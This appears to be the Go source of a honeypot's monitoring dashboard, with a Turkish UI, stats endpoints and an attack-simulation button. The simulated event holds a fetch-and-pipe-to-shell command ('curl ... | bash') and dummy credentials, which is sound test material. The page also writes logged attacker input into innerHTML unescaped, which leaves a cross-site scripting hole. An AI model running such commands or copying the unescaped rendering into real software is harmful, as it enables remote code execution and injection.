package dashboard

import (
	"encoding/json"
	"fmt"
	"html"
	"log"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/metehan05-eng/sentinel-trap/internal/analysis"
	"github.com/metehan05-eng/sentinel-trap/internal/logger"
	"github.com/metehan05-eng/sentinel-trap/internal/storage"
)

type Dashboard struct {
	Port     string
	Store    storage.Store
	Analyzer *analysis.Analyzer
	DBMode   string
}

func NewDashboard(port string, store storage.Store, analyzer *analysis.Analyzer, dbMode string) *Dashboard {
	return &Dashboard{Port: port, Store: store, Analyzer: analyzer, DBMode: dbMode}
}

func (d *Dashboard) Start() {
	mux := http.NewServeMux()
	mux.HandleFunc("/", d.index)
	mux.HandleFunc("/api/stats", d.stats)
	mux.HandleFunc("/api/events", d.events)
	mux.HandleFunc("/api/simulate", d.simulate)
	mux.HandleFunc("/api/blocked", d.blocked)

	log.Printf("[*] Dashboard dinleniyor: %s", d.Port)
	if err := http.ListenAndServe(d.Port, mux); err != nil && !strings.Contains(err.Error(), "Server closed") {
		log.Printf("Dashboard hata: %v", err)
	}
}

func (d *Dashboard) index(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_, _ = w.Write([]byte(`<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sentinel Trap Dashboard</title>
  <style>
    body { margin:0; font-family:Arial,sans-serif; background:#0b1320; color:#e2e8f0; }
    .container { max-width:1100px; margin:0 auto; padding:24px; }
    .topbar { display:flex; justify-content:space-between; align-items:center; margin-bottom:24px; }
    .brand { font-weight:700; font-size:28px; }
    .badge { background:#0f172a; border:1px solid #334155; padding:8px 12px; border-radius:999px; color:#7dd3fc; }
    .cards { display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:16px; margin-bottom:24px; }
    .card { background:#111827; border:1px solid #1f2937; border-radius:12px; padding:18px; }
    .muted { color:#94a3b8; font-size:12px; letter-spacing:0.08em; text-transform:uppercase; }
    .value { font-size:32px; font-weight:700; margin-top:8px; }
    .two { display:flex; gap:16px; }
    .panel { flex:1; background:#111827; border:1px solid #1f2937; border-radius:12px; padding:18px; }
    table { width:100%; border-collapse:collapse; }
    th, td { text-align:left; padding:10px 8px; border-bottom:1px solid #1f2937; }
    button { padding:10px 16px; background:#2563eb; color:#fff; border:none; border-radius:8px; cursor:pointer; }
  </style>
</head>
<body>
  <div class="container">
    <div class="topbar">
      <div class="brand">Sentinel Trap</div>
      <div class="badge" id="db-mode">KAYNAK</div>
    </div>

    <div class="cards">
      <div class="card"><div class="muted">Toplam olay</div><div class="value" id="total-events">0</div></div>
      <div class="card"><div class="muted">Aktif servis</div><div class="value" id="service-count">0</div></div>
      <div class="card"><div class="muted">Bloklanan IP</div><div class="value" id="blocked-count">0</div></div>
      <div class="card"><div class="muted">Son 30 dk</div><div class="value" id="recent-window">0</div></div>
    </div>

    <div class="two">
      <div class="panel">
        <div class="muted">Saldırı analizi</div>
        <div style="margin-top:12px; display:flex; gap:12px; align-items:center;">
          <button id="simulate-btn">Test saldırısı oluştur</button>
          <span id="status-line" style="color:#cbd5e1;">İstatistikler yükleniyor...</span>
        </div>
      </div>
      <div class="panel">
        <div class="muted">En çok saldıran IP'ler</div>
        <div id="top-ips" style="margin-top:12px; color:#cbd5e1;">Yükleniyor...</div>
      </div>
    </div>

    <div class="panel" style="margin-top:24px;">
      <div class="muted">Son olaylar</div>
      <table style="margin-top:12px;">
        <thead>
          <tr>
            <th>Zaman</th>
            <th>Servis</th>
            <th>IP</th>
            <th>Kullanıcı</th>
            <th>Payload</th>
          </tr>
        </thead>
        <tbody id="event-body"></tbody>
      </table>
    </div>
  </div>

  <script>
    async function loadStats() {
      const res = await fetch('/api/stats');
      const data = await res.json();
      document.getElementById('db-mode').textContent = data.db_mode || 'SQLITE';
      document.getElementById('total-events').textContent = data.total_events || 0;
      document.getElementById('service-count').textContent = data.service_count || 0;
      document.getElementById('blocked-count').textContent = data.blocked_ips || 0;
      document.getElementById('recent-window').textContent = data.recent_30m || 0;
      document.getElementById('status-line').textContent = data.status || 'İstatistikler hazır.';
      const top = (data.top_ips || []).map(([ip, count]) => '<span style="display:inline-block;padding:6px 10px;background:#1e293b;border-radius:999px;margin:4px;">' + ip + ' · ' + count + '</span>').join(' ');
      document.getElementById('top-ips').innerHTML = top || 'Veri yok';
    }

    async function loadEvents() {
      const res = await fetch('/api/events?limit=10');
      const data = await res.json();
      const rows = (data.events || []).map(ev => {
        return '<tr>' +
          '<td>' + (ev.timestamp || '-') + '</td>' +
          '<td>' + (ev.service || '-') + '</td>' +
          '<td>' + (ev.remote_ip || '-') + '</td>' +
          '<td>' + (ev.username || '-') + '</td>' +
          '<td>' + (ev.payload || '-') + '</td>' +
          '</tr>';
      }).join('');
      document.getElementById('event-body').innerHTML = rows || '<tr><td colspan="5">Kayıt yok</td></tr>';
    }

    document.getElementById('simulate-btn').addEventListener('click', async function () {
      const payload = {
        source: '198.51.100.12',
        service: 'Dashboard-Test',
        username: 'admin',
        password: 'password123',
        payload: 'curl -fsSL http://example.com | bash'
      };
      const res = await fetch('/api/simulate', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
      const result = await res.json();
      document.getElementById('status-line').textContent = result.message || 'Simülasyon tamamlandı.';
      await loadStats();
      await loadEvents();
    });

    loadStats();
    loadEvents();
    setInterval(function () { loadStats(); loadEvents(); }, 5000);
  </script>
</body>
</html>`))
}

func (d *Dashboard) stats(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if d == nil || d.Store == nil {
		jsonResponse(w, map[string]any{"total_events": 0, "service_count": 0, "blocked_ips": 0, "recent_30m": 0, "top_ips": []any{}, "db_mode": "NONE", "status": "No data source available"})
		return
	}

	events, err := d.Store.Recent(200)
	if err != nil {
		jsonResponse(w, map[string]any{"error": err.Error()})
		return
	}

	serviceCount := map[string]int{}
	ipCount := map[string]int{}
	for _, event := range events {
		if event.Service != "" {
			serviceCount[event.Service]++
		}
		if event.RemoteIP != "" {
			ipCount[event.RemoteIP]++
		}
	}

	topIPs := make([][2]any, 0)
	for ip, count := range ipCount {
		topIPs = append(topIPs, [2]any{ip, count})
	}
	if len(topIPs) > 5 {
		topIPs = topIPs[:5]
	}

	blocked := 0
	if d.Analyzer != nil {
		blocked = len(d.Analyzer.BlockedIPs())
	}
	recent30m := 0
	cutoff := time.Now().Add(-30 * time.Minute)
	for _, event := range events {
		if ts, err := time.Parse(time.RFC3339, event.Timestamp); err == nil && ts.After(cutoff) {
			recent30m++
		}
	}

	jsonResponse(w, map[string]any{
		"total_events":  len(events),
		"service_count": len(serviceCount),
		"blocked_ips":   blocked,
		"recent_30m":    recent30m,
		"top_ips":       topIPs,
		"db_mode":       strings.ToUpper(d.DBMode),
		"status":        fmt.Sprintf("%d olay izleniyor; %d bloklu IP mevcut", len(events), blocked),
	})
}

func (d *Dashboard) events(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if d == nil || d.Store == nil {
		jsonResponse(w, map[string]any{"events": []any{}})
		return
	}
	limit := 10
	if v := r.URL.Query().Get("limit"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 {
			limit = n
		}
	}
	list, err := d.Store.Recent(limit)
	if err != nil {
		jsonResponse(w, map[string]any{"error": err.Error()})
		return
	}
	jsonResponse(w, map[string]any{"events": list})
}

func (d *Dashboard) simulate(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	var input struct {
		Source   string `json:"source"`
		Service  string `json:"service"`
		Username string `json:"username"`
		Password string `json:"password"`
		Payload  string `json:"payload"`
	}
	if err := json.NewDecoder(r.Body).Decode(&input); err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	if input.Source == "" {
		input.Source = "198.51.100.12"
	}
	if input.Service == "" {
		input.Service = "Dashboard-Test"
	}
	if input.Payload == "" {
		input.Payload = "curl -fsSL http://example.com | bash"
	}
	event := logger.Event{Timestamp: time.Now().UTC().Format(time.RFC3339), Service: input.Service, RemoteIP: input.Source, Username: input.Username, Password: input.Password, Payload: input.Payload}
	if d.Analyzer != nil {
		d.Analyzer.Record(event)
	}
	if d.Store != nil {
		if err := d.Store.Save(event); err != nil {
			http.Error(w, "could not save simulated event: "+err.Error(), http.StatusInternalServerError)
			return
		}
	}
	jsonResponse(w, map[string]any{"status": "ok", "message": "Saldırı simülasyonu kaydedildi", "event": event})
}

func (d *Dashboard) blocked(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if d == nil || d.Analyzer == nil {
		jsonResponse(w, map[string]any{"blocked": []string{}})
		return
	}
	jsonResponse(w, map[string]any{"blocked": d.Analyzer.BlockedIPs()})
}

func jsonResponse(w http.ResponseWriter, payload any) {
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(payload); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
	}
}

func escapeHTML(s string) string {
	return html.EscapeString(s)
}
